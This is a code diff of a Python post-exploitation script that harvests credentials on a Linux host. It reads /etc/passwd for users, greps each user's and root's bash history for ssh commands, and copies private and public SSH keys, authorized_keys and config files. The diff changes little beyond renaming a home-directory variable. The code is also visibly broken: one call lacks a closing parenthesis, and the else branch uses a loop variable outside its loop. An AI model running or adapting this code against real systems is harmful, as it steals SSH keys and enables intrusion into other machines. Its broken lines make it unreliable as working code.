@@ -4,7 +4,6 @@
 @author: ohdae [bindshell@live.com]
 '''
 def users():
-    global userlist
     userlist = []
     if os.access('/etc/passwd', os.R_OK):
         passwd = open('/etc/passwd')
@@ -29,7 +28,7 @@ def get_creds():
 
         for user in userlist:
             cmd2txt("cat /home/%s/.bash_history | grep ssh" % user, "%s-SSH-History.txt" % user)
-            cmd2txt("cat %s/.bash_history | grep ssh" % Home_Dir, "Root-SSH-History.txt")
+            cmd2txt("cat %s/.bash_history | grep ssh" % home, "Root-SSH-History.txt")
             cmd2txt("ls /home/%s/.ssh/*" % user, "ssh_%s.txt" % user)
             save_file("/home/%s/.ssh/id_dsa" % user)
             save_file("/home/%s/.ssh/id_dsa.pub" % user)
@@ -37,22 +36,22 @@ def get_creds():
             save_file("/home/%s/.ssh/id_rsa.pub" % user)
             save_file("/home/%s/.ssh/authorized_keys" % user)
             save_file("/home/%s/.ssh/config" % user)
-            save_file("%s/.ssh/id_dsa" % Home_Dir)
-            save_file("%s/.ssh/id_dsa.pub" % Home_Dir)
-            save_file("%s/.ssh/id_rsa" % Home_Dir)
-            save_file("%s/.ssh/id_rsa.pub" % Home_Dir)
-            save_file("%s/.ssh/authorized_keys" % Home_Dir)
-            save_file("%s/.ssh/config" % Home_Dir
+            save_file("%s/.ssh/id_dsa" % home)
+            save_file("%s/.ssh/id_dsa.pub" % home)
+            save_file("%s/.ssh/id_rsa" % home)
+            save_file("%s/.ssh/id_rsa.pub" % home)
+            save_file("%s/.ssh/authorized_keys" % home)
+            save_file("%s/.ssh/config" % home
 
     else:
         cmd2txt("cat /home/%s/.bash_history | grep ssh" % user, "%s-SSH-History.txt" % user)
-        save_file("%s/.ssh/id_dsa" % Home_Dir)
-        save_file("%s/.ssh/id_dsa.pub" % Home_Dir)
-        save_file("%s/.ssh/id_rsa" % Home_Dir)
-        save_file("%s/.ssh/id_rsa.pub" % Home_Dir)
-        save_file("%s/.ssh/authorized_keys" % Home_Dir)
-        save_file("%s/.ssh/config" % Home_Dir)
-        cmd2txt("ls %s/.ssh/*" % Home_Dir, "ssh_contents.txt")
+        save_file("%s/.ssh/id_dsa" % home)
+        save_file("%s/.ssh/id_dsa.pub" % home)
+        save_file("%s/.ssh/id_rsa" % home)
+        save_file("%s/.ssh/id_rsa.pub" % home)
+        save_file("%s/.ssh/authorized_keys" % home)
+        save_file("%s/.ssh/config" % home)
+        cmd2txt("ls %s/.ssh/*" % home, "ssh_contents.txt")
 
 
 get_creds()
